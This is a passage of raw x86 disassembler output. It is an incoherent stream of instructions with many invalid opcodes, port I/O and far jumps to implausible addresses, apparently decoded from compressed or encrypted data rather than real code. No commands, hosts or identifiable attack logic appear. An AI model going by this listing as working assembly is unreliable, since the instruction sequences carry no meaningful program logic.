  417156:	cmp    DWORD PTR [eax+0x72],edi
  417159:	fst    st(6)
  41715b:	sbb    ecx,DWORD PTR [esi-0x4f13fe13]
  417161:	dec    eax
  417162:	mov    edx,eax
  417164:	shl    BYTE PTR [eax+0x7],1
  417167:	mov    bh,0xc3
  417169:	xor    DWORD PTR [eax+0x285ddd27],ebp
  41716f:	and    DWORD PTR es:[esi+0x403d3945],edx
  417176:	(bad)  
  417177:	xchg   ecx,eax
  417178:	gs mov ah,bl
  41717b:	sbb    eax,0x5481ef10
  417180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417181:	ins    BYTE PTR es:[edi],dx
  417182:	out    0x7,eax
  417184:	fs pop esi
  417186:	(bad)  
  417189:	dec    ebp
  41718a:	icebp  
  41718b:	hlt    
  41718c:	test   al,0x6f
  41718e:	xchg   ecx,eax
  41718f:	ds mov cs,edi
  417192:	rol    DWORD PTR [ebx+0x62],1
  417195:	or     BYTE PTR [edx+0x2598b720],ah
  41719b:	in     al,dx
  41719c:	jae    0x41719a
  41719e:	call   0x437c64a1
  4171a3:	es ret 0x5f7b
  4171a7:	xor    dl,ah
  4171a9:	sub    edx,DWORD PTR [ecx+0x4b]
  4171ac:	cmc    
  4171ad:	in     al,0xe2
  4171af:	(bad)  
  4171b0:	loope  0x417175
  4171b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171b3:	das    
  4171b4:	or     ecx,DWORD PTR [esi+esi*2]
  4171b7:	in     eax,0x30
  4171b9:	mov    ecx,DWORD PTR [ebp-0x29]
  4171bc:	ds jns 0x417225
  4171bf:	and    al,0x55
  4171c1:	jg     0x4171bc
  4171c3:	mov    bl,0x22
  4171c5:	mov    cl,0xf1
  4171c7:	add    ebx,DWORD PTR [edi]
  4171c9:	cs dec edi
  4171cb:	push   0xffffffe5
  4171cd:	add    eax,0xdae5c632
  4171d2:	xor    al,0x78
  4171d4:	push   ecx
  4171d5:	jl     0x417160
  4171d7:	push   es
  4171d8:	mov    bl,0x84
  4171da:	mov    bl,0x7a
  4171dc:	mov    DWORD PTR [ebx],esi
  4171de:	push   ebx
  4171df:	push   ecx
  4171e0:	inc    edx
  4171e1:	pop    es
  4171e2:	mov    BYTE PTR [ebp-0x4e],bh
  4171e5:	xchg   ebp,eax
  4171e6:	mov    ds:0x88a2d9f8,al
  4171eb:	aad    0xdb
  4171ed:	pop    edx
  4171ef:	pop    edi
  4171f0:	and    bh,BYTE PTR [ebx-0x6733a5f3]
  4171f6:	xchg   edi,eax
  4171f7:	and    edi,DWORD PTR [esi+0x41984d98]
  4171fd:	dec    esp
  4171fe:	adc    DWORD PTR [edi-0x41f448c3],esp
  417204:	mov    ds:0x1d88ca63,eax
  417209:	fnstsw WORD PTR [ebx]
  41720b:	popf   
  41720c:	mov    es,WORD PTR [ecx+0x49b8f179]
  417212:	test   eax,0x51e106c1
  417217:	sub    BYTE PTR [ecx-0x5219ae24],0x84
  41721e:	loope  0x417286
  417220:	add    al,BYTE PTR [edx-0x66d10ea3]
  417226:	push   ss
  417227:	ror    BYTE PTR [edx+0x2956322a],1
  41722d:	arpl   sp,ax
  41722f:	sub    esp,eax
  417231:	clc    
  417232:	sbb    DWORD PTR [ebp-0x28],ebp
  417235:	cmp    eax,0xb420feb
  41723a:	ins    DWORD PTR es:[edi],dx
  41723b:	lahf   
  41723c:	mov    esi,0xc397e47
  417241:	out    dx,eax
  417242:	jns    0x417287
  417244:	jle    0x417258
  417246:	pop    ecx
  417247:	inc    ebx
  417248:	push   ss
  417249:	hlt    
  41724a:	retf   0x4326
  41724d:	ins    DWORD PTR es:[edi],dx
  41724e:	test   BYTE PTR [edi+esi*2-0x28588a90],bh
  417255:	into   
  417256:	xor    BYTE PTR [ecx-0x53079775],ah
  41725c:	add    DWORD PTR [edx+0x28],eax
  41725f:	ds xchg ecx,eax
  417261:	retf   
  417262:	ja     0x417215
  417264:	sbb    ah,BYTE PTR [edx-0x28]
  417267:	xchg   esi,eax
  417268:	fsub   DWORD PTR [ecx]
  41726a:	int    0x8e
  41726c:	icebp  
  41726d:	push   esi
  41726e:	sbb    eax,0x453b6a36
  417273:	aas    
  417274:	dec    edx
  417275:	adc    cl,0x68
  417278:	or     ch,al
  41727a:	cwde   
  41727b:	aaa    
  41727c:	pop    ebp
  41727d:	shr    ecx,0x26
  417280:	shr    DWORD PTR [eax],0xfc
  417283:	pop    ecx
  417284:	loope  0x4172df
  417286:	mov    ebp,DWORD PTR [ebp+0x4f0e04f]
  41728c:	pop    edi
  41728d:	mov    bh,0x6
  41728f:	sub    BYTE PTR [edx+esi*2],dl
  417292:	daa    
  417293:	popf   
  417294:	outs   dx,DWORD PTR ds:[esi]
  417295:	sbb    edx,DWORD PTR [esi]
  417297:	inc    esp
  417298:	cld    
  417299:	out    dx,eax
  41729a:	outs   dx,BYTE PTR ds:[esi]
  41729b:	pop    ss
  41729c:	jp     0x417224
  41729e:	sbb    BYTE PTR [ebp+0x1c8a9b59],0x2
  4172a5:	sub    eax,0x3408d957
  4172aa:	inc    eax
  4172ab:	cmp    esp,DWORD PTR [ecx+0x8]
  4172ae:	xor    dl,dl
  4172b0:	fcmove st,st(2)
  4172b2:	jmp    0x923f56d2
  4172b7:	mov    al,0xb7
  4172b9:	call   0x4302973
  4172be:	fsubr  QWORD PTR [ebx+eiz*2-0xc1fc604]
  4172c5:	adc    esp,edx
  4172c7:	into   
  4172c8:	sbb    eax,0xf4cb03a6
  4172cd:	sti    
  4172ce:	sbb    DWORD PTR [esi+0x5a633266],edi
  4172d4:	shr    DWORD PTR [edi-0x5fcac00c],0xcd
  4172db:	frstor [edx-0x5e9a3d53]
  4172e1:	fsubr  DWORD PTR [ecx]
  4172e3:	lahf   
  4172e4:	xor    al,0x7b
  4172e6:	dec    esp
  4172e7:	adc    bh,BYTE PTR [eax]
  4172e9:	mov    ds:0xbc54ec4c,eax
  4172ee:	sbb    bl,BYTE PTR [edx+edx*1-0x2a]
  4172f2:	fucomi st,st(4)
  4172f4:	xor    esi,DWORD PTR [eax]
  4172f6:	sub    eax,0xe717f063
  4172fb:	mov    bl,0xe5
  4172fd:	cwde   
  4172fe:	inc    ecx
  4172ff:	sbb    DWORD PTR [edx+0xdc63b21],ecx
  417305:	mov    ebx,0x4315ca4d
  41730a:	and    ebx,DWORD PTR [edx+ebx*4-0x36669453]
  417311:	dec    edi
  417312:	in     al,dx
  417313:	inc    esi
  417314:	dec    edx
  417315:	jb     0x417349
  417317:	retf   
  417318:	add    eax,0x1fcd1429
  41731d:	dec    eax
  41731e:	pop    ebx
  41731f:	std    
  417320:	aam    0x1f
  417322:	add    BYTE PTR [eax+0x1aaf4b5d],dh
  417328:	push   0x3e
  41732a:	jp     0x4173a5
  41732c:	dec    esp
  41732d:	sub    eax,0xc4249fc0
  417332:	leave  
  417333:	mov    ah,0xe6
  417335:	push   cs
  417336:	add    eax,0x127946b3
  41733b:	outs   dx,BYTE PTR ds:[esi]
  41733c:	adc    dh,BYTE PTR ds:0x3650759
  417342:	xor    esi,DWORD PTR [ecx+0x1d5dc177]
  417348:	adc    al,0x36
  41734a:	ret    0xf45c
  41734d:	pop    eax
  41734e:	adc    eax,0x3aa0ec6a
  417353:	mov    ebx,0x394685c
  417358:	scas   eax,DWORD PTR es:[edi]
  417359:	hlt    
  41735a:	das    
  41735b:	jo     0x41735b
  41735d:	mov    ds:0x4b820dfb,al
  417362:	xchg   esi,eax
  417363:	(bad)
  417366:	dec    edx
  417367:	xchg   edx,eax
  417368:	shl    DWORD PTR [ecx+0x6],0x11
  41736c:	add    BYTE PTR [ebp+edx*2-0x32],cl
  417370:	push   es
  417371:	jo     0x417316
  417373:	dec    ebx
  417374:	repnz daa 
  417376:	popa   
  417377:	aam    0x82
  417379:	shl    ebp,1
  41737b:	push   esi
  41737c:	adc    cl,BYTE PTR [ebx]
  41737e:	jo     0x4173b7
  417380:	xor    ah,al
  417382:	push   0xffffff89
  417384:	xchg   esp,eax
  417385:	bound  ebx,QWORD PTR [eax+eax*2-0xdd092c2]
  41738c:	push   esp
  41738d:	dec    ebp
  41738e:	ret    0x3d4d
  417391:	test   al,0x49
  417393:	aaa    
  417394:	ret    0x9f58
  417397:	sub    DWORD PTR ds:0x9c6cd5d7,ecx
  41739d:	ss mov ebp,0x1dcedbc8
  4173a3:	aas    
  4173a4:	mov    ecx,0x9f883583
  4173a9:	sub    eax,0x46b8467b
  4173ae:	add    cl,BYTE PTR [esi-0x5d6398e8]
  4173b4:	sbb    eax,0x40be0d8b
  4173b9:	ror    DWORD PTR [edx],1
  4173bb:	es sahf 
  4173bd:	mov    dh,0x8e
  4173bf:	inc    esp
  4173c0:	and    bh,ch
  4173c2:	sbb    DWORD PTR [edx-0x7a],edx
  4173c5:	sbb    DWORD PTR [esi+0x39],esi
  4173c8:	(bad)
  4173cd:	repz sbb eax,0xc0b91bc0
  4173d3:	push   ebp
  4173d4:	pop    es
  4173d5:	push   cs
  4173d6:	into   
  4173d7:	xor    ch,BYTE PTR [ebx]
  4173d9:	test   BYTE PTR [esi],al
  4173db:	fidiv  WORD PTR [ecx+ecx*4+0xc583677]
  4173e2:	or     DWORD PTR [eax],eax
  4173e4:	adc    BYTE PTR [eax],bh
  4173e6:	popf   
  4173e7:	fs jp  0x4173b7
  4173ea:	xchg   ebx,eax
  4173eb:	stos   DWORD PTR es:[edi],eax
  4173ec:	je     0x4173ae
  4173ee:	icebp  
  4173ef:	adc    esi,ebx
  4173f1:	cli    
  4173f2:	mov    eax,DWORD PTR [edi-0x3aae6d5a]
  4173f8:	adc    ebx,DWORD PTR [edx+0x3e]
  4173fb:	scas   eax,DWORD PTR es:[edi]
  4173fc:	dec    edx
  4173fd:	fidivr DWORD PTR ds:0xae205510
  417403:	rol    BYTE PTR [esi+0x32],cl
  417406:	nop
  417407:	pusha  
  417408:	push   edi
  417409:	aad    0x27
  41740b:	mov    eax,0xe62d0104
  417410:	sub    al,0xe2
  417412:	add    DWORD PTR [ecx-0x51],ebx
  417415:	add    BYTE PTR [bp+di],0x26
  417419:	repnz ss (bad) 
  41741c:	stc    
  41741d:	fcmove st,st(4)
  41741f:	sbb    ah,BYTE PTR es:[ecx+edx*4+0x65]
  417424:	mov    ah,0x48
  417426:	pushf  
  417427:	jae    0x41741b
  417429:	and    DWORD PTR [eax-0x23],ebx
  41742c:	mov    bl,0x11
  41742e:	or     eax,DWORD PTR [ebp+0x4d]
  417431:	test   BYTE PTR [ebp-0x41],bl
  417434:	cmovge ecx,DWORD PTR [ebx-0x17d9bf77]
  41743b:	inc    edx
  41743c:	pop    ebx
  41743d:	dec    esp
  41743e:	jg     0x4173c2
  417440:	cs pop esp
  417442:	int    0x79
  417444:	or     ah,BYTE PTR [edi]
  417446:	mov    bh,0xef
  417448:	in     al,dx
  417449:	shl    WORD PTR [esi],0x24
  41744d:	int    0xfb
  41744f:	xchg   ebx,eax
  417450:	and    eax,0xbe75170c
  417455:	or     eax,0xa1081750
  41745a:	jg     0x41748a
  41745c:	mov    ebp,0xd4e18f6d
  417461:	cmc    
  417462:	push   ss
  417463:	(bad)  
  417465:	mov    bh,0x78
  417467:	dec    esp
  417469:	test   al,0x50
  41746b:	ins    DWORD PTR es:[edi],dx
  41746c:	mov    edx,0x421c59b9
  417471:	add    eax,DWORD PTR [edx-0x6a184783]
  417477:	pop    esi
  417478:	aaa    
  417479:	cld    
  41747a:	mov    al,ds:0x8d6c096b
  41747f:	sub    eax,0x233d23f1
  417484:	rcl    BYTE PTR [edx],0xa3
  417487:	push   ss
  417488:	sub    cl,BYTE PTR [edi-0x504bc281]
  41748e:	cmp    al,al
  417490:	or     BYTE PTR [esp+edx*1+0x4b],ah
  417494:	data16 cld 
  417496:	mov    ecx,cs
  417498:	loopne 0x4174a7
  41749a:	stos   BYTE PTR es:[edi],al
  41749b:	mov    esi,0x50147ab8
  4174a0:	push   ebx
  4174a1:	lods   al,BYTE PTR ds:[esi]
  4174a2:	sbb    DWORD PTR [edx+esi*1-0xd],0xffffffb8
  4174a7:	(bad)  
  4174a8:	out    dx,eax
  4174a9:	xchg   ebx,eax
  4174aa:	adc    dh,BYTE PTR [edi]
  4174ac:	mov    bh,BYTE PTR [eax]
  4174ae:	push   0xb7b55c11
  4174b3:	mov    ecx,0x63a9d8d7
  4174b8:	or     DWORD PTR [ecx+0x61d6cbc],ebx
  4174be:	frstor [edi]
  4174c0:	in     al,dx
  4174c1:	cmp    ch,BYTE PTR [ebx-0x4819e166]
  4174c7:	icebp  
  4174c8:	or     al,0xed
  4174ca:	jne    0x4174d8
  4174cc:	in     al,0x7
  4174ce:	aas    
  4174cf:	dec    ebx
  4174d0:	dec    ebp
  4174d1:	ret    
  4174d2:	dec    ecx
  4174d3:	test   DWORD PTR [esp+ecx*4+0x4b],ecx
  4174d7:	js     0x417507
  4174d9:	retf   
  4174da:	bound  esp,QWORD PTR ss:[ebx+esi*2+0x1e]
  4174df:	push   es
  4174e0:	pop    edi
  4174e1:	cli    
  4174e2:	fisttp QWORD PTR [ebx]
  4174e4:	push   eax
  4174e5:	(bad)  
  4174e6:	imul   eax,DWORD PTR [ebp-0x7f],0xffffffe0
  4174ea:	iret   
  4174eb:	int3   
  4174ec:	dec    esp
  4174ed:	les    esi,FWORD PTR [ebx-0x78]
  4174f0:	jno    0x417559
  4174f2:	jb     0x417503
  4174f4:	in     al,dx
  4174f5:	adc    al,BYTE PTR [ebx+0x2d144de1]
  4174fb:	add    DWORD PTR [edx+0x70],ecx
  4174fe:	pop    ss
  4174ff:	iret   
  417500:	push   es
  417501:	stos   BYTE PTR es:[edi],al
  417502:	jle    0x417564
  417504:	xlat   BYTE PTR ds:[ebx]
  417505:	fst    QWORD PTR [edx-0x3ace3fd6]
  41750b:	mov    esi,0xcc4f6fb8
  417510:	std    
  417511:	lahf   
  417512:	out    dx,al
  417513:	xchg   esi,eax
  417514:	sub    DWORD PTR ds:0xd14580f,esi
  41751a:	add    eax,0xdda3b327
  41751f:	jae    0x417594
  417521:	arpl   WORD PTR [ebx+edi*4+0xe0755b7],ax
  417528:	ins    BYTE PTR es:[edi],dx
  417529:	adc    eax,edi
  41752b:	dec    esp
  41752c:	inc    eax
  41752d:	pop    ebx
  41752e:	dec    edi
  41752f:	inc    ebp
  417530:	or     DWORD PTR [edx-0x78],esp
  417533:	scas   eax,DWORD PTR es:[edi]
  417534:	arpl   WORD PTR cs:[esi],di
  417537:	push   edi
  417538:	push   ds
  417539:	cli    
  41753a:	jecxz  0x4174f8
  41753c:	mov    edi,edi
  41753e:	pop    ebp
  41753f:	jo     0x4174ec
  417541:	loopne 0x417545
  417543:	int3   
  417544:	sub    BYTE PTR [ebp-0x1e],0xdc
  417548:	repz xchg edx,eax
  41754a:	out    0xad,eax
  41754c:	dec    BYTE PTR [edi]
  41754e:	push   edx
  41754f:	lods   eax,DWORD PTR ds:[esi]
  417550:	lods   eax,DWORD PTR ds:[esi]
  417551:	mov    DWORD PTR [ebx],ebp
  417553:	mov    cl,0x4c
  417555:	jecxz  0x4174eb
  417557:	clc    
  417558:	mov    esi,0x88bc63d7
  41755d:	dec    edi
  41755e:	inc    esp
  41755f:	retf   0x498d
  417562:	or     eax,0x5e44d5ee
  417567:	xchg   ecx,eax
  417568:	xchg   esp,eax
  417569:	add    cl,dh
  41756b:	jl     0x4175d3
  41756d:	dec    ebx
  41756e:	add    al,0xef
  417570:	dec    eax
  417571:	sti    
  417572:	inc    ecx
  417573:	xor    BYTE PTR [edi],ch
  417575:	shrd   DWORD PTR [ecx],ecx,cl
  417578:	out    dx,eax
  417579:	inc    eax
  41757a:	push   ss
  41757b:	sbb    al,0x20
  41757d:	gs in  al,dx
  41757f:	ret    0xc73f
  417582:	ins    BYTE PTR es:[edi],dx
  417583:	inc    edi
  417584:	jmp    0x41752d
  417586:	(bad)  
  417588:	leave  
  417589:	dec    edi
  41758a:	sbb    bl,dl
  41758c:	push   0xfffffff2
  41758e:	push   ebp
  41758f:	xchg   ecx,eax
  417590:	iret   
  417591:	mov    dl,0xa9
  417593:	xchg   ebx,eax
  417594:	fild   QWORD PTR [esi+0x18]
  417597:	jne    0x41754a
  417599:	dec    edx
  41759a:	cmp    al,0x8b
  41759c:	scas   eax,DWORD PTR es:[edi]
  41759d:	fadd   QWORD PTR [ebx]
  41759f:	sbb    ebp,DWORD PTR cs:[ebp-0x1ac72b50]
  4175a6:	jecxz  0x4175de
  4175a8:	mov    ds:0xba605730,eax
  4175ad:	addr16 mov ds:0x885f,eax
  4175b1:	dec    ebp
  4175b2:	pusha  
  4175b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175b4:	repz test al,0x50
  4175b7:	fxch   st(1)
  4175b9:	loop   0x417623
  4175bb:	add    al,0x5e
  4175bd:	rcl    DWORD PTR [ecx],cl
  4175bf:	add    DWORD PTR [eax-0x71eff687],ebx
  4175c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175c7:	call   0xc338:0x9af74f92
  4175ce:	pop    edi
  4175cf:	aam    0x63
  4175d1:	push   cs
  4175d2:	scas   eax,DWORD PTR es:[edi]
  4175d3:	stos   BYTE PTR es:[edi],al
  4175d4:	lods   al,BYTE PTR ds:[esi]
  4175d5:	mov    ebx,0xb3bad241
  4175da:	call   0x8b8e:0x78499d7a
  4175e1:	ror    DWORD PTR [eax-0x4d3ff93d],cl
  4175e7:	imul   eax,edx,0x6e2390cf
  4175ed:	push   0x7edf0050
  4175f2:	add    edx,edx
  4175f4:	push   ss
  4175f5:	and    ah,BYTE PTR [ecx+0x3f]
  4175f8:	pop    es
  4175f9:	xor    edi,ecx
  4175fb:	xchg   ecx,eax
  4175fc:	push   eax
  4175fd:	sar    dh,0xb8
  417600:	into   
  417601:	rcl    DWORD PTR [edx-0x58],0xdc
  417605:	retf   0x2a3f
  417608:	or     ah,BYTE PTR [edi]
  41760a:	int    0x62
  41760c:	test   al,0x64
  41760e:	sub    edx,DWORD PTR ds:0x469c533
  417614:	ret    
  417615:	sub    DWORD PTR [esp+ecx*8-0x5b86b55d],edi
  41761c:	repnz mov cl,0x2d
  41761f:	jge    0x41765c
  417621:	pop    edx
  417622:	sub    dl,ah
  417624:	mov    ebp,0x677d2a28
  417629:	or     BYTE PTR [edi+0x15],0x17
  41762d:	fisubr DWORD PTR [ebx]
  41762f:	clc    
  417630:	bswap  esp
  417632:	les    esi,FWORD PTR [ebx]
  417634:	aaa    
  417635:	push   0xfffffff6
  417637:	rcr    BYTE PTR [esi-0x40],1
  41763a:	out    dx,eax
  41763b:	push   cs
  41763c:	mov    esp,0x98237f7c
  417641:	shl    DWORD PTR [ecx-0x45],cl
  417644:	add    cl,BYTE PTR [esi-0x24a5f185]
  41764a:	gs jl  0x417673
  41764d:	inc    ecx
  41764e:	adc    BYTE PTR [eax-0x78],0xa3
  417652:	je     0x417629
  417654:	pop    eax
  417655:	jae    0x4175f0
  417657:	mov    esp,0x234d866
  41765c:	inc    ecx
  41765d:	icebp  
  41765e:	mov    al,0x67
  417660:	divps  xmm6,XMMWORD PTR [ecx]
  417663:	jmp    0x7144:0x23ea94b0
  41766a:	mov    edx,0x6cd953ba
  41766f:	inc    esp
  417670:	loopne 0x417641
  417672:	ret    0xffa
  417675:	xor    ch,BYTE PTR [esi-0xe]
  417678:	test   BYTE PTR [edi],al
  41767a:	jbe    0x41764d
  41767c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41767d:	in     eax,0xf2
  41767f:	pop    esp
  417680:	xor    ebp,edx
  417682:	mov    esp,0x7bbbfdc6
  417687:	add    al,0x27
  417689:	fsubr  st,st(6)
  41768b:	push   cs
  41768c:	out    0xf1,eax
  41768e:	jl     0x4176a9
  417690:	mov    esp,0x35528685
  417695:	test   eax,0x44a9864e
  41769a:	in     al,dx
  41769b:	(bad)  
  41769c:	loopne 0x4176ec
  41769e:	das    
  41769f:	aam    0xa7
  4176a1:	sahf   
  4176a2:	push   ebx
  4176a3:	push   esi
  4176a4:	mov    al,al
  4176a6:	shl    BYTE PTR [eax+0x25376b0e],cl
  4176ac:	dec    ebx
  4176ad:	push   edx
  4176ae:	pushf  
  4176af:	iret   
  4176b0:	ins    BYTE PTR es:[edi],dx
  4176b1:	mov    edi,DWORD PTR [ebp+0x4d]
  4176b4:	and    dl,al
  4176b6:	outs   dx,BYTE PTR ds:[esi]
  4176b7:	add    al,BYTE PTR [eax+0x7f]
  4176ba:	fcom   QWORD PTR [edi+0x22]
  4176bd:	sbb    ecx,DWORD PTR [edi]
  4176bf:	inc    ebp
  4176c0:	adc    eax,0x9eee6dad
  4176c5:	out    0x33,al
  4176c7:	outs   dx,DWORD PTR ds:[esi]
  4176c8:	rol    ebp,cl
  4176ca:	jp     0x4176e2
  4176cc:	sub    BYTE PTR [esi-0x6859f02a],al
  4176d2:	xor    esp,DWORD PTR [esi+0x6e4dd7b9]
  4176d8:	sar    ebp,0xf4
  4176db:	and    DWORD PTR [esi+0x4c150fac],ecx
  4176e1:	sbb    bh,dl
  4176e3:	inc    ecx
  4176e4:	mov    cs,WORD PTR gs:[ebx]
  4176e7:	pop    ds
  4176e8:	pop    edx
  4176e9:	cmp    ebp,eax
  4176eb:	(bad)  
  4176ec:	xor    bh,BYTE PTR [esi-0x51]
  4176ef:	inc    ebx
  4176f0:	pop    ebp
  4176f1:	cmp    edx,DWORD PTR [esi+eax*4-0x7bec3ece]
  4176f8:	or     BYTE PTR ds:0x13b1fa60,ch
  4176fe:	add    DWORD PTR [ecx-0x1ef8f794],ebx
  417704:	jl     0x417728
  417706:	mov    eax,0x28498a9a
  41770b:	or     al,0x9
  41770d:	adc    eax,0xd852f4f7
  417712:	mov    ch,0xa7
  417714:	lahf   
  417715:	mov    BYTE PTR [esi+edx*1-0x58],ch
  417719:	daa    
  41771a:	mov    eax,0xaa5fac28
  41771f:	cmp    dh,BYTE PTR ds:0x8e7634e
  417725:	add    DWORD PTR [ebx-0x54],esp
  417728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417729:	pop    ecx
  41772a:	push   ecx
  41772b:	mov    dh,0xda
  41772d:	add    dl,BYTE PTR [ebx]
  41772f:	push   esp
  417730:	xor    dh,BYTE PTR [bp+di]
  417733:	sub    al,0xed
  417735:	das    
  417736:	aad    0xa
  417738:	arpl   WORD PTR [ecx],bx
  41773a:	loop   0x4177a3
  41773c:	das    
  41773d:	dec    edi
  41773e:	cmp    eax,0x65e2607
  417743:	repnz inc ebx
  417745:	adc    ebp,DWORD PTR cs:[esi-0x1d2cb6fc]
  41774c:	ja     0x4176ee
  41774e:	bound  esi,QWORD PTR [ecx+0x4e]
  417751:	idiv   eax
  417753:	out    dx,eax
  417754:	mov    BYTE PTR ds:[edi],ch
  417757:	or     al,0x70
  417759:	fwait
  41775a:	mov    bl,0xcd
  41775c:	add    DWORD PTR [edx],esi
  41775e:	mov    ebp,0xd162f6e3
  417763:	stc    
  417764:	(bad)  
  417765:	(bad)  
  417766:	int3   
  417767:	pop    ebp
  417768:	mov    ebp,0x935531f9
  41776d:	xchg   BYTE PTR [eax],cl
  41776f:	mov    edi,0x7d60eadc
  417774:	mov    esi,0x721f9127
  417779:	cli    
  41777a:	jne    0x4177e0
  41777c:	and    ecx,DWORD PTR [edi]
  41777e:	loopne 0x417725
  417780:	jnp    0x417709
  417782:	out    dx,eax
  417783:	cmp    dl,bl
  417785:	pop    ds
  417786:	cmp    ch,BYTE PTR [esi-0x62]
  417789:	sbb    al,0xb8
  41778b:	int    0x36
  41778d:	lock repz fild QWORD PTR [edx-0x7b35b407]
  417795:	ret    0x1875
  417798:	(bad)  
  417799:	in     al,dx
  41779a:	addr16 and eax,0x2ee8b45a
  4177a0:	sbb    al,0x6d
  4177a2:	push   0x79
  4177a4:	cmc    
  4177a5:	ins    DWORD PTR es:[edi],dx
  4177a6:	scas   eax,DWORD PTR es:[edi]
  4177a7:	inc    ecx
  4177a8:	push   0xffffffa9
  4177aa:	jnp    0x41775d
  4177ac:	test   bl,cl
  4177ae:	scas   eax,DWORD PTR es:[edi]
  4177af:	fistp  WORD PTR [ecx-0x23844b38]
  4177b5:	aam    0x4d
  4177b7:	sub    DWORD PTR [edi-0x7c],0xf387ef0a
  4177be:	or     eax,0xe4140b19
  4177c4:	xor    ecx,DWORD PTR [edx+0x51]
  4177c7:	stos   DWORD PTR es:[edi],eax
  4177c8:	enter  0x308c,0x2
  4177cc:	xchg   edi,eax
  4177cd:	test   al,0x6b
  4177cf:	xchg   edx,eax
  4177d0:	dec    esp
  4177d1:	inc    ecx
  4177d2:	push   cs
  4177d3:	xchg   edx,eax
  4177d4:	rcr    eax,cl
  4177d6:	(bad)  
  4177d7:	enter  0x6366,0x41
  4177db:	scas   al,BYTE PTR es:[edi]
  4177dc:	sbb    al,0x24
  4177de:	arpl   WORD PTR [esi],sp
  4177e0:	mov    bh,0x51
  4177e2:	cwde   
  4177e3:	dec    ebx
  4177e4:	adc    BYTE PTR [ebx+0x2e0baad],0x2
  4177eb:	lock mov esp,0xb67cbf3a
  4177f1:	pop    edi
  4177f2:	fiadd  DWORD PTR [edx+ebx*1-0x2f]
  4177f6:	es out 0xd8,eax
  4177f9:	(bad)  
  4177fa:	in     eax,dx
  4177fb:	sbb    edx,DWORD PTR [ecx]
  4177fd:	clc    
  4177fe:	popf   
  4177ff:	cmp    ebp,edx
  417801:	pop    edi
  417802:	pop    ss
  417803:	dec    edx
  417804:	idiv   BYTE PTR cs:[edx-0x22c03a0a]
  41780b:	pop    es
  41780c:	add    esi,DWORD PTR [edx+eiz*1]
  41780f:	mov    cl,BYTE PTR [edi-0x5]
  417812:	in     al,dx
  417813:	fstp   DWORD PTR [edi-0x1b2bb7ce]
  417819:	xor    esi,DWORD PTR [eax-0x7a5afdb6]
  41781f:	dec    edx
  417820:	sub    ebp,DWORD PTR [edx+eiz*1+0x29]
  417824:	rcl    DWORD PTR [esi+0x572ce9fe],1
  41782a:	mov    BYTE PTR ds:0xb2253490,dh
  417830:	pop    ds
  417831:	scas   eax,DWORD PTR es:[edi]
  417832:	dec    eax
  417833:	sti    
  417834:	adc    ch,BYTE PTR [ebp-0x568b6e8]
  41783a:	fadd   DWORD PTR [edi]
  41783c:	or     eax,0x4c7defab
  417841:	xchg   esp,eax
  417842:	inc    ebx
  417843:	popf   
  417844:	test   al,0xfa
  417846:	pop    ds
  417847:	xor    esp,DWORD PTR [eax-0x6]
  41784a:	sub    eax,0xae0e44da
  41784f:	sahf   
  417850:	out    dx,eax
  417851:	mov    ch,0xc9
  417853:	sub    BYTE PTR [ecx-0xf],0x54
  417857:	mov    ah,0x69
  417859:	jns    0x41786f
  41785b:	mov    ebp,0x8baf1b25
  417860:	adc    ch,BYTE PTR [ebp-0x26]
  417863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417864:	mov    fs,WORD PTR [edi]
  417866:	idiv   bh
  417868:	jecxz  0x4178e8
  41786a:	fs jns 0x4178ec
  41786d:	pop    ds
  41786e:	pop    esi
  41786f:	repnz sub BYTE PTR [edi+0x3822fe8f],0x67
  417877:	sub    BYTE PTR [ebx],bl
  417879:	dec    ebp
  41787a:	in     eax,dx
  41787b:	dec    ecx
  41787c:	push   ecx
  41787d:	jmp    0xd681:0xa9bae805
  417884:	jp     0x417884
  417886:	pop    edi
  417887:	mov    edx,0x5b565b11
  41788c:	pop    es
  41788d:	mov    dh,0x75
  41788f:	xchg   edi,eax
  417890:	ror    DWORD PTR [esi-0x71ae364d],0x32
  417897:	(bad)  
  417898:	mov    esp,0xd115af2f
  41789d:	mov    dh,0xa5
  41789f:	lods   eax,DWORD PTR ds:[esi]
  4178a0:	sbb    DWORD PTR [edx+0xa770c92],edi
  4178a6:	mov    WORD PTR [edx-0x11],gs
  4178a9:	sbb    al,BYTE PTR [ebx-0x22]
  4178ac:	pop    ss
  4178ad:	mov    cl,0x7a
  4178af:	cs cld 
  4178b1:	loopne 0x4178ae
  4178b3:	cdq    
  4178b4:	xchg   edx,eax
  4178b5:	rol    bl,0x95
  4178b8:	adc    esi,ebx
  4178ba:	ins    BYTE PTR es:[edi],dx
  4178bb:	inc    esi
  4178bc:	mov    edx,edx
  4178be:	sub    dl,BYTE PTR [edi+0x13]
  4178c1:	ret    0x1edf
  4178c4:	mov    esp,0xccfacb54
  4178c9:	jne    0x4178da
  4178cb:	fisttp DWORD PTR es:[ebx+0x131bd9e9]
  4178d2:	lahf   
  4178d3:	dec    esi
  4178d4:	iret   
  4178d5:	ja     0x417872
  4178d7:	dec    esp
  4178d8:	outs   dx,BYTE PTR ds:[esi]
  4178d9:	outs   dx,DWORD PTR ds:[esi]
  4178da:	in     al,0x18
  4178dc:	ins    DWORD PTR es:[edi],dx
  4178dd:	(bad)  [eax+0x381f2e22]
  4178e3:	fwait
  4178e4:	pusha  
  4178e5:	sar    BYTE PTR ds:[esi+0xd6e4fb6],0x71
  4178ed:	fisubr DWORD PTR [ecx]
  4178ef:	pusha  
  4178f0:	cmc    
  4178f1:	data16 sbb ch,0x94
  4178f5:	pop    edx
  4178f6:	push   ss
  4178f7:	pushf  
  4178f8:	adc    bl,dh
  4178fa:	jb     0x41788b
  4178fc:	cdq    
  4178fd:	ds cmp eax,0xcf474c10
  417903:	imul   ebp,DWORD PTR [ecx-0x6b],0xffffffef
  417907:	jmp    0x8b5a:0x65a00bd6
  41790e:	(bad)  
  41790f:	popa   
  417910:	arpl   WORD PTR [edx-0x7f4da803],bp
  417916:	pusha  
  417917:	(bad)  
  417919:	fistp  WORD PTR [ebx-0x3e47b173]
  41791f:	aas    
  417920:	into   
  417921:	ret    0xe9d6
  417924:	imul   eax,DWORD PTR fs:[esi-0x73c3adaf],0x22
